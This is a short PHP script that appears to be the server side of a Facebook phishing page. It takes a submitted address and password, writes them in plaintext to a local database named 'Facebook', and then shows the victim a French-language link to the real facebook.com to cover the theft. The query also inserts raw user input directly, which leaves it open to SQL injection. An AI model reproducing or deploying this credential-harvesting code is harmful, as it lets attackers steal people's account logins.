
<?php

$conn = new mysqli("localhost","root","","Facebook");
$Adress = $_POST["Adress"];
$password = $_POST["password"];

$sql = "INSERT INTO serva (Adress,password)
            values('$Adress','$password')";

// $requete = mysqli_query('$sql','$conn');
$requete=$conn->query($sql);
if($requete){
	// echo "Please Check Your Connection And Try Again"
	echo "<a href='https://www.facebook.com' target='_blank'>Cliquer Ici Pour Commencer Sur Facebook</a>";
	
}
else {
	echo "Facebook doesn't work yet";
}

?>